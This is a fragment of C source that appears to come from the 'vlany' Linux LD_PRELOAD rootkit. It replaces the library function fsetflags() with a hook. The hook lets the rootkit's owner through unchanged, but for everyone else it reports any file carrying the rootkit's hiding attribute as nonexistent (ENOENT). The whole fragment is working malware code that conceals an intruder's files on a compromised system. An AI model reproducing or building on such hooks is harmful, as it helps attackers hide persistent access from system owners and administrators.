int fsetflags(const char *name, unsigned long flags)
{
    #ifdef DEBUG
        printf("[vlany] fsetflags() called\n");
    #endif

    HOOK(old_fsetflags, CFSETFLAGS);

    if(owned()) return old_fsetflags(name, flags);

    if(hidden_xattr(name)) { errno = ENOENT; return -1; }

    return old_fsetflags(name, flags);
}
